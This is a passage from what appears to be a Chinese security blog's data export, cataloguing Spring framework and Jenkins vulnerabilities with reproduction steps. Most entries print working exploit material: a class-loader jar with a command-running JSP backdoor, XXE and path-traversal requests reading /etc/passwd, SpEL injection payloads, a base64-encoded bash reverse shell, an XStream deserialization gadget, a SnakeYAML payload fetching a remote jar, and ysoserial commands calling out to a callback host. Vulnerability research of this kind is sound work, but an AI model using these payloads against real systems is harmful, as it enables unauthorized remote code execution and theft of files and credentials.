通信安全通信加密这种更像是web漏洞，主要查看是否使用了https加密流量，并且是否有正确的证书配置。加密算法是否在TLSv1.1以上。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"Spring 框架漏洞集合","slug":"Spring-框架漏洞集合","date":"2020-04-01T05:18:10.000Z","updated":"2020-04-01T05:18:10.000Z","comments":true,"path":"2020/04/Spring-框架漏洞集合/","link":"","permalink":"https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/","excerpt":"","text":"虽说是Spring框架漏洞，但以下包含并不仅Spring Framework，Spring Boot，还有Spring Cloud，Spring Data，Spring Security等。 CVE-2010-1622 Spring Framework class.classLoader类远程代码执行影响版本：SpringSource Spring Framework 3.0.0 - 3.0.2、SpringSource Spring Framework 2.5.0 - 2.5.7 Spring框架提供了一种机制，该机制使用客户端提供的数据来更新对象属性。这个机制允许攻击者修改用于加载对象的类加载器的属性（通过’class.classloader’）。这可能导致任意命令执行，例如，攻击者可以修改URL。由类加载器用来指向攻击者控制的位置。 示例： POST &#x2F;adduser HTTP&#x2F;1.0 ... firstName &#x3D; Tavis&amp;lastName &#x3D; Ormandy 如果Person是表单的支持对象，则firstName和lastName属性将设置为相应的值。为了支持更复杂的类，Spring还支持点表示法，因此user.address.street &#x3D; Disclosure + Str。将等效于： frmObj.getUser().getAddress().setStreet(&quot;Disclosure Str.&quot;) 问题是Spring Beans的CachedIntrospectionResults类枚举了可从用户表单提交中设置的属性，使用 java.beans.Introspector.getBeanInfo()而不指定停止类，这意味着&#39; class &#39;属性及其后的所有内容均可用于HTTP请求中的设置。 攻击 如果攻击者使用以下HTTP参数向表单控制器提交HTTP请求： POST &#x2F;adduser HTTP&#x2F;1.0 ... class.classLoader.URLs[0] &#x3D; jar:http:&#x2F;&#x2F;attacker&#x2F;spring-exploit.jar! 她将 使用自己的网址覆盖frmObj.getClass().getClassLoader().getURLs() 返回的数组中的第0个元素. 它将是哪个类加载器？ 在Apache Tomcat上的情况下，它指org.apache.catalina.loader.WebappClassLoader 如何构造这个jar，需要包含以下信息： - META-INF&#x2F;spring-form.tld - 定义spring表单标签并指定实现为标签文件而不是类 - META-INF&#x2F;tags&#x2F;中的标签文件，包含有标签定义（任意Java代码） /META-INF/spring-form.tld文件： &lt;!-- &lt;form:input&#x2F;&gt; tag --&gt; &lt;tag-file&gt; &lt;name&gt;input&lt;&#x2F;name&gt; &lt;path&gt;&#x2F;META-INF&#x2F;tags&#x2F;InputTag.tag&lt;&#x2F;path&gt; &lt;&#x2F;tag-file&gt; /META-INF/tags/InputTag.tag &lt;%@ tag dynamic-attributes&#x3D;&quot;dynattrs&quot; %&gt; &lt;% j java.lang.Runtime.getRuntime().exec(&quot;mkdir &#x2F;tmp&#x2F;PWNED&quot;); %&gt; 做出这样的替换后，当开发者在controller中将任何一个对象绑定表单，并且最终展示的jsp内容有下面这些： &lt;%@ taglib prefix&#x3D;&quot;form&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;tags&#x2F;form&quot;%&gt; &lt;form:form commandName&#x3D;&quot;user&quot;&gt; &lt;form:input path&#x3D;&quot;name&quot;&#x2F;&gt; &lt;&#x2F;form:form&gt; 攻击者访问url,即可触发远程代码执行的效果: http:&#x2F;&#x2F;inbreak.net&#x2F;springmvc&#x2F;testjsp.htm? class.classLoader.URLs[0]&#x3D;jar:https:&#x2F;&#x2F;inbreak.net&#x2F;spring-exploit.jar!&#x2F; 如果服务器大于tomcat6.0.28版本，这样做会把所有的input标签替换掉，导致不能正常显示。需要修改 spring-form.tld，给其中的inputtag改名，name改为inputkxlzx： &lt;tag&gt; &lt;name&gt;inputkxlzx&lt;&#x2F;name&gt; &#x2F;&#x2F;什么名字都行 在文件中新加入一个tag，叫做input： &lt;tag-file&gt; &lt;name&gt;input&lt;&#x2F;name&gt; &lt;path&gt;&#x2F;WEB-INF&#x2F;tags&#x2F;InputTag.tag&lt;&#x2F;path&gt; &lt;&#x2F;tag-file&gt; InputTag.tag的内容： &lt;%@ tag dynamic-attributes&#x3D;&quot;dynattrs&quot; %&gt; &lt;% if (request.getParameter(&quot;kxlzxcmd&quot;)!&#x3D;null) exec(request.getParameter(&quot;kxlzxcmd&quot;)); %&gt; &lt;form:inputkxlzx path&#x3D;&quot;$&#123;dynattrs.path&#125;&quot;&gt;&lt;&#x2F;form:inputkxlzx&gt; 访问的时候需要在参数中携带kxlzxcmd &#x2F;test.htm?name&#x3D;kxlzx&amp;kxlzxcmd&#x3D;calc &#x2F;&#x2F;包含input的页面 http://blog.o0o.nu/2010/06/cve-2010-1622.html https://www.inbreak.net/archives/377 CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入影响版本：3.0.0至3.2.3、4.0.0.M1 受影响版本容易受到XML外部实体（XXE）注入的攻击。该SourceHttpMessageConverter处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。 当传输xml结构体时，如 &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> &lt;username>John&lt;/username> &lt;/xml> 外部XML实体- xxe是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 /etc/passwd并将其显示给呈现给用户。 &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]> &lt;username>&amp;xxe;&lt;/username> &lt;/xml> 其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。 CVE-2013-7315 Spring Framework中的XML外部实体影响版本：3.2.0至3.2.3、4.0.0.M1-4.0.0.M2（Spring MVC） 由于对 CVE-2013-4152和CVE-2013-6429的修复不完整导致。 受影响版本容易受到XML外部实体（XXE）注入的攻击。该SourceHttpMessageConverter处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。 当传输xml结构体时，如 &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> &lt;username>John&lt;/username> &lt;/xml> 外部XML实体- xxe是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 /etc/passwd并将其显示给呈现给用户。 &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]> &lt;username>&amp;xxe;&lt;/username> &lt;/xml> 其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。 CVE-2014-3527 Spring Security验证绕过漏洞影响版本： SpringSource Spring Security 3.1-3.2.4 当使用从Spring Security 3.1到3.2.4的CAS代理票证身份验证时，恶意的CAS服务可能会欺骗另一个CAS服务来认证未关联的代理票证。这是由于以下事实：代理票证身份验证使用了来自HttpServletRequest的信息，该信息是根据HTTP请求中的不可信信息填充的。这意味着，如果存在CAS服务可以相互认证的访问控制限制，则可以绕过这些限制。如果用户未使用CAS代理票证，并且未基于CAS服务做出访问控制决策，则对用户没有影响。 CVE-2014-0097 Spring Security认证绕过影响版本：Spring Security 3.2.0至3.2.1和3.1.0至3.1.5 ActiveDirectoryLdapAuthenticator不检查密码长度。如果目录允许匿名绑定，则它可能会错误地验证提供空密码的用户。 CVE-2014-3578 Spring Framework 目录遍历漏洞影响版本： Spring Framework: - 3.0.4 to 3.2.11 - 4.0.0 to 4.0.7 - 4.1.0 to 4.1.1 在web.xml存在如下情况下存在目录遍历： &lt;mvc:resources mapping&#x3D;&quot;&#x2F;css&#x2F;**&quot; location&#x3D;&quot;file:webapps&#x2F;springapp&#x2F;WEB-INF&#x2F;classes&#x2F;theme&#x2F;css&#x2F;&quot; &#x2F;&gt; 访问： GET &#x2F;springapp&#x2F;css&#x2F;file:&#x2F;etc&#x2F;passwd CVE-2016-2173 Spring AMQP中的远程代码执行影响版本：1.0.0至1.5.4 https://github.com/HaToan/CVE-2016-2173 使用方式： - ysoserial-0.0.4-all.jar create payload write and execute a shell + java -jar ysoserial-0.0.4-all.jar &#39;library_vul&#39; &#39;command&#39; - exploit-cve2016-2173.jar : send to App vul + java -jar exploit-cve2016-2173.jar 本来想根据配置来搭一个环境处理，结果环境一直搭不起来，构建各种失败，就先放这个利用poc把。 CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞影响版本：2.0.0-2.0.9、1.0.0-1.0.5 https://www.seebug.org/vuldb/ssvid-92474 漏洞利用POC： http:&#x2F;&#x2F;localhost:8080&#x2F;oauth&#x2F;authorize?response_type&#x3D;token&amp;client_id&#x3D;acme&amp;redirect_uri&#x3D;$&#123;2334-1&#125; 执行命令： http:&#x2F;&#x2F;207.246.79.196:8080&#x2F;oauth&#x2F;authorize?response_type&#x3D;token&amp;client_id&#x3D;acme&amp;redirect_uri&#x3D;$&#123;T(java.lang.Runtime).getRuntime().exec(%22ping%20xxx.ceye.io%22)&#125; 但是此命令执行，不会在页面上显示，只会打印出运行的对象。 如果要执行反弹shell等命令，由于页面HTML编码的原因，SPEL返回值时进行了一次html编码，所以导致取出的 值时会进行一次转义，利用如下脚本加工。 #coding:utf-8 message &#x3D; input(&#39;Enter message to encode:&#39;) print(&#39;Decoded string (in ASCII):\\n&#39;) print(&#39;T(java.lang.Character).toString(%s)&#39; % ord(message[0]), end&#x3D;&quot;&quot;) for ch in message[1:]: print(&#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch), end&#x3D;&quot;&quot;), print(&#39;\\n&#39;) print(&#39;new java.lang.String(new byte[]&#123;&#39;, end&#x3D;&quot;&quot;), print(ord(message[0]), end&#x3D;&quot;&quot;) for ch in message[1:]: print(&#39;,%s&#39; % ord(ch), end&#x3D;&quot;&quot;), print(&#39;)&#125;&#39;) 执行输出后再添加： T(java.lang.Runtime).getRuntime().exec(payload) CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞影响版本：1.1.0-1.1.12、1.2.0-1.2.7、1.3.0 https://www.cnblogs.com/litlife/p/10183137.html 下载存在漏洞的版本1.3.0：https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip POC： &#x2F;?payload&#x3D;$&#123;new%20java.lang.String(new%20byte[]&#123;70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66&#125;)&#125; 结果： FBB204A4061FFBD41284A84C258C1BFB 返回结果是md5(wooyun) CVE-2016-6652 Spring Data JPA SQL盲注影响版本：Spring Data JPA 1.10.2、1.9.4 https://www.seebug.org/vuldb/ssvid-92534 CVE-2017-4971 Spring WebFlow 远程代码执行漏洞影响版本：Spring Web Flow 2.4.0 to 2.4.4 使用vulhub搭建环境后，在添加poc执行 &amp;_(new+java.lang.ProcessBuilder(&quot;ping&quot;,&quot;xxx.ceye.io&quot;)).start()&#x3D;vulhub 无害化payload检测，如果 response header 中出现 vulnerable 头，则有漏洞： &amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa&#x3D;n1nty CVE-2017-8045 Spring Amqp中的远程代码执行影响版本：1.7.4、1.6.11和1.5.7之前的Spring AMQP版本 https://xz.aliyun.com/t/36 CVE-2017-8046 Spring Data REST PATCH请求远程执行代码影响版本：Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本、Spring Data release trains Kay-RC3之前的版本、Spring Boot 2.0.0M4之前的版本 https://www.cnblogs.com/co10rway/p/9380441.html 利用POC执行： [&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&#39;ping xxx.ceye.io&#39;))&#x2F;lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;] 反弹shell，其中反弹shell命令需要借助编码来减少重定向出错的问题java.lang.Runtime.exec() Payload Workarounds： [&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzg4OTkgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;))&#x2F;lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;] CVE-2018-1258 Spring Security未经授权的访问影响版本：Spring Framework 5.0.5.RELEASE和Spring Security（任何版本） 暂无详细信息 CVE-2018-1259 具有XMLBeam的Spring DataXXE影响版本： XMLBeam 1.4.14或更早版本结合使用的Spring Data Commons Spring Data Commons 1.13至1.13.11（Ingalls SR11） Spring Data REST 2.6至2.6.11（Ingalls SR11） Spring Data Commons 2.0至2.0.6（Kay SR6） Spring Data REST 3.0至3.0.6（Kay SR6） http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/ https://xz.aliyun.com/t/2341 CVE-2018-1270 Spring Messaging远程代码执行漏洞影响版本：Spring Framework 5.0 to 5.0.4。Spring Framework 4.3 to 4.3.14 同样利用vulhub搭建环境，首先我们先拦截connect，查看通过的ws包，点击后会有这么一个请求 ws:&#x2F;&#x2F;x.x.x.x:8080&#x2F;gs-guide-websocket&#x2F;845&#x2F;beqcexeb&#x2F;websocket 从bp中看到来回四个包，其中的内容为如上所示，修改如下请求包 在发送任意消息，即可触发 或者尝试使用vulhub提供的脚本，但是此脚本并不具备通用性，需要修改使用poc CVE-2018-1271 Spring MVC 目录穿越漏洞当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。 此漏洞触发条件较高： Server运行于Windows系统上 从文件系统提供的文件服务（比如使用file协议，但不是file open） 没有使用CVE-2018-1199漏洞的补丁 不使用Tomcat或者是WildFly做Server 漏洞利用和复现: https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/ CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞影响版本： Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5 (Kay SR5) https://www.cnblogs.com/hac425/p/9656747.html POC： username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]&#x3D;xxx username[T(java.lang.Runtime).getRuntime().exec(&quot;ping+xxx.ceye.io&quot;)]&#x3D;test CVE-2018-1260 Spring Security Oauth2 远程代码执行影响版本： Spring Security OAuth 2.3 to 2.3.2 Spring Security OAuth 2.2 to 2.2.1 Spring Security OAuth 2.1 to 2.1.1 Spring Security OAuth 2.0 to 2.0.14 https://www.seebug.org/vuldb/ssvid-97287 此漏洞和CVE-2016-4977类似 POC： http:&#x2F;&#x2F;localhost:8080&#x2F;oauth&#x2F;authorize?client_id&#x3D;client&amp;response_type&#x3D;code&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;www.baidu.com&amp;scope&#x3D;%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20r9rub4.ceye.io%22%29%7D CVE-2018-15758 spring-security-oauth2权限提升影响版本： Spring Security OAuth 2.3至2.3.3 Spring Security OAuth 2.2至2.2.2 Spring Security OAuth 2.1至2.1.2 Spring Security OAuth 2.0到2.0.15 使用了EnableResourceServer并且用了AuthorizationRequest的话。那么攻击者可以重新发送一次用过的验证请求，或者进行相应参数修改，从而造成权限提升。 例如劫持code，并且篡改其中的scope到all的话： http:&#x2F;&#x2F;localhost:8080&#x2F;oauth&#x2F;authorize?client_id&#x3D;client&amp;response_type&#x3D;code&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;127.0.0.1&amp;scope&#x3D;openid 即授权了读取权限的时候，修改为all就可以获得全部权限。 CVE-2019-3799 Spring Cloud Config Server: 目录遍历影响版本：Spring-Cloud-Config-Server &lt; 2.1.2, 2.0.4, 1.4.6 下载受影响的版本构建：https://github.com/spring-cloud/spring-cloud-config cd spring-cloud-config-server ..&#x2F;mvnw spring-boot:run 构建成功后访问： http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;test&#x2F;pathtraversal&#x2F;master&#x2F;..%252f..%252f..%252f..%252f..&#x2F;etc&#x2F;passwd ![image-20200401100511941](Spring 漏洞.assets/image-20200401100511941.png) 其中路径代表：/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/，如下中所显示的json。 CVE-2019-3778 Spring Security OAuth 开放重定向影响版本： Spring Security OAuth 2.3 to 2.3.4 Spring Security OAuth 2.2 to 2.2.3 Spring Security OAuth 2.1 to 2.1.3 Spring Security OAuth 2.0 to 2.0.16 https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70 用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。 只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。 例如原始请求如下： &#x2F;auth&#x2F;oauth&#x2F;authorize?response_type&#x3D;code&amp;client_id&#x3D;R2dpxQ3vPrtfgF72&amp;scope&#x3D;user_info&amp;state&#x3D;HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;localhost:8086&#x2F;login 只需要修改为： &#x2F;auth&#x2F;oauth&#x2F;authorize?response_type&#x3D;code&amp;client_id&#x3D;R2dpxQ3vPrtfgF72&amp;scope&#x3D;user_info&amp;state&#x3D;HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;%localhost:8086&#x2F;login 这样就不会产生原本的认证错误，而且直接跳转到地址 Location: http:&#x2F;&#x2F;localhost:8086&#x2F;login CNVD-2019-11630 Spring Boot Actuator命令执行漏洞https://www.veracode.com/blog/research/exploiting-spring-boot-actuators# 这个漏洞并不像是单一的问题产生，更像是一个渗透入侵的过程。有很多值得在意的知识点 Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于/actuator路径下。 &#x2F;dump-显示线程转储（包括堆栈跟踪） &#x2F;trace-显示最后几条HTTP消息（其中可能包含会话标识符） &#x2F;logfile-输出日志文件的内容 &#x2F;shutdown-关闭应用程序 &#x2F;mappings-显示所有MVC控制器映射 &#x2F;env-提供对配置环境的访问 &#x2F;restart-重新启动应用程序 jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：http://127.0.0.1:8090/jolokia/list Logback库提供的reloadByURL操作使我们可以从外部URL重新加载日志配置，地址如： http:&#x2F;&#x2F;localhost:8090&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:!&#x2F;!&#x2F;artsploit.com!&#x2F;logback.xml logback.xml： &lt;configuration&gt; &lt;insertFromJNDI env-entry-name&#x3D;&quot;ldap:&#x2F;&#x2F;artsploit.com:1389&#x2F;jndi&quot; as&#x3D;&quot;appName&quot; &#x2F;&gt; &lt;&#x2F;configuration&gt; reloadByURL功能从http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。 通过/env来修改配置 如果Spring Cloud Libraries在类路径中，则**’/ env’**端点允许您修改Spring环境属性。 POST /env HTTP/1.1 Host: 127.0.0.1:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 65 eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream 此属性将Eureka serviceURL修改为任意值。Eureka Server通常用作发现服务器，目标类路径中具有Eureka-Client &lt;1.8.7，则可以利用其中的XStream反序列化漏洞。 其中xstream的内容类似如下： &lt;linked-hash-set&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;value class&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class&#x3D;&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class&#x3D;&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class&#x3D;&quot;javax.crypto.NullCipher&quot;&gt; &lt;serviceIterator class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class&#x3D;&quot;java.util.Collections$EmptyIterator&quot;&#x2F;&gt; &lt;next class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&lt;&#x2F;string&gt; &lt;&#x2F;command&gt; &lt;redirectErrorStream&gt;false&lt;&#x2F;redirectErrorStream&gt; &lt;&#x2F;next&gt; &lt;&#x2F;iter&gt; &lt;filter class&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;&#x2F;class&gt; &lt;name&gt;start&lt;&#x2F;name&gt; &lt;parameter-types&#x2F;&gt; &lt;&#x2F;method&gt; &lt;name&gt;foo&lt;&#x2F;name&gt; &lt;&#x2F;filter&gt; &lt;next class&#x3D;&quot;string&quot;&gt;foo&lt;&#x2F;next&gt; &lt;&#x2F;serviceIterator&gt; &lt;lock&#x2F;&gt; &lt;&#x2F;cipher&gt; &lt;input class&#x3D;&quot;java.lang.ProcessBuilder$NullInputStream&quot;&#x2F;&gt; &lt;ibuffer&gt;&lt;&#x2F;ibuffer&gt; &lt;&#x2F;is&gt; &lt;&#x2F;dataSource&gt; &lt;&#x2F;dataHandler&gt; &lt;&#x2F;value&gt; &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt; &lt;&#x2F;linked-hash-set&gt; 然后调用’/ refresh’端点。 有一种通过Spring环境属性修改来实现RCE的更可靠方法： POST /env HTTP/1.1 Host: 127.0.0.1:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 59 spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml 该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“/refresh”端点。 POST /refresh HTTP/1.1 Host: 127.0.0.1:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 0 从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成： !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://artsploit.com/yaml-payload.jar\"] ]] ] 该jar文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。jar文件可以在如下地址找到：https://github.com/artsploit/yaml-payload /env配置 除了关于执行RCE的地方，还有一些设置也很有用。 **spring.datasource.tomcat.validationQuery = drop + table + users-**允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。 spring.datasource.tomcat.url = jdbc:hsqldb:https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。 这种设置只在1.x中，在Spring Boot 2.x中，改为了json格式。 CVE-2019-11269 Spring Security OAuth 开放重定向此漏洞为CVE-2019-3778的延伸版本，效果一致 影响版本： Spring Security OAuth 2.3至2.3.5 Spring Security OAuth 2.2至2.2.4 Spring Security OAuth 2.1至2.1.4 Spring Security OAUth 2.0至2.0.17 CVE-2020-5398 Spring Framework RFD漏洞影响版本： Spring Framework, versions 5.2.0 to 5.2.3, 5.1.0 to 5.1.13, 5.0.0 to 5.0.16 触发此漏洞的要求可以控制content-disposition文件名和扩展名来下载文件。触发的类型有些类似钓鱼文件。 &lt;a href&#x3D;”https:&#x2F;&#x2F;&lt;trusted-server&gt;.com&#x2F;api&#x2F;users&#x2F;&lt;attacker_id&gt;.cmd&quot; download&gt; Click me, Im a dolphin &lt;&#x2F;a&gt; 先准备一个受控制的配置文件等，上传到受信的服务器中，虽然对服务器不造成影响。但是可以在其中注入一些payload。 由于下载的文件名是受前端控制，发送filename的时候可以自己构造文件名下载。 spring对不能识别的文件下载的时候按照json格式来处理，但是url仍然可以使用。 当受害者点击如上的地址时，会下载一个.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。 但是这个设置可以绕过，采用如下形式： filename：secure_install.cmd&quot;; 会在表头中闭合造成如下效果： Content-Disposition: attachment; filename&#x3D;&quot;secure_install.cmd&quot;;.txt&quot; 从而达到绕过限制来下载预先设定好的可执行文件等。 CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露影响版本：spring-cloud-config-server &lt; 2.2.2 https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md poc： 利用点1： curl http:&#x2F;&#x2F;127.0.0.1:9988&#x2F;foo&#x2F;profiles&#x2F;%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp&#x2F;aaa.xxx 读取&#x2F;User&#x2F;xuanyonghao&#x2F;tmp&#x2F;aaa.xxx文件 foo 对应 &#123;application&#125; profiles 对应 &#123;profiles&#125; %252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp 对应 &#123;label&#125; todo 条件限制： todo 1. 文件必须有后缀，也就是.txt等等。 todo 2. cloud: config: server: native: search-locations: file:&#x2F;&#x2F;&#x2F;tmp&#x2F;&#123;label&#125;，此处的目录需要有&#123;application&#125;或&#123;profiles&#125;或&#123;label&#125;，因为在上述触发点会对url对应段进行替换进来location，导致目录穿越，但是会限制文件后缀 利用点2： org.springframework.cloud.config.server.resource.ResourceController#resolveLabel(java.lang.String) 利用此处把label处的(_)替换为&#x2F; curl http:&#x2F;&#x2F;127.0.0.1:9988&#x2F;foo&#x2F;profiles&#x2F;..%28_%29Users%28_%29xuanyonghao%28_%29tmp&#x2F;aaa.xxx todo 条件限制： todo 1. 文件必须有后缀，也就是.txt等等。 todo 2. 不像利用点1处，不需要配置&#123;application&#125;&#123;profiles&#125;&#123;label&#125;","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Jenkins漏洞集合复现","slug":"Jenkins漏洞集合复现","date":"2020-03-27T06:56:40.000Z","updated":"2020-03-27T07:07:18.000Z","comments":true,"path":"2020/03/Jenkins漏洞集合复现/","link":"","permalink":"https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"复现文章和脚本大都是网上收集，大部分能找到出处的，个别找不到明确的地址。 CVE-2015-8103 反序列化远程代码执行1.638之前的Jenkins和1.625.2之前的LTS中的Jenkins CLI子系统，允许远程攻击者通过制作的序列化Java对象执行有问题的commons-collections。 利用脚本：https://github.com/LeoHuang2015/jenkins-cli-exploit 执行后有类似如下反应： 还可以使用msf中的模块exploit/linux/misc/jenkins_java_deserialize来执行攻击反弹shell。 CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞CloudBeesJenkinsCI1.650之前版本和LTS1.642.2之前版本的remoting模块中存在安全漏洞。远程攻击者可通过打开JRMP监听程序利用该漏洞执行任意代码。 利用需要X-Jenkins-CLI2-Port对应的端口，如果Jenkins无法获取CLI版本2的端口标头“ X-Jenkins-CLI2-Port”，它会退回到版本1。 利用ys生成二进制文件：java -jar ysoserial.jar CommonsCollections3 &quot;curl http://r9rub4.ceye.io/&quot; &gt; payload.bin 利用脚本：https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py 发送的二进制文件实际上是十六进制的(&lt;===[JENKINS REMOTING CAPACITY]===&gt;)与其后base64的编码构成。使用类似反应如下： CVE-2016-0792 低权限用户命令执行影响版本：jenkins小于 1.650 利用脚本：https://github.com/jpiechowka/jenkins-cve-2016-0792 执行后类似如下 CVE-2016-9299 代码执行2.32之前的Jenkins和2.19.3之前的LTS中的远程处理模块允许远程攻击者通过精心制作的序列化Java对象执行任意代码，从而触发对第三方服务器的LDAP查询。 关于这个漏洞的分析和代码利用，已经有详细的分析文章：https://paper.seebug.org/199/ msf有成熟的利用模块：exploit/linux/misc/jenkins_ldap_deserialize CVE-2017-1000353 Jenkins-CI 远程代码执行影响版本：Jenkins&lt;=2.56。Jenkins LTS &lt;= 2.46.1 下载pochttps://github.com/vulhub/CVE-2017-1000353 执行生成字节码文件。 java -jar CVE-2017-1000353-SNAPSHOT-all.jar jenkins_poc.ser &quot;curl http:&#x2F;&#x2F;xxx.ceye.io&quot; 利用py文件来进行发送 python exploit.py http:&#x2F;&#x2F;x.x.x.x:8080 jenkins_poc.ser 会有如下反应 CVE-2018-1000110 用户枚举模糊搜索：http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;search&#x2F;?q&#x3D;a http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;search&#x2F;suggest?query&#x3D;a 如果git插件小于3.7，也可以使用如下 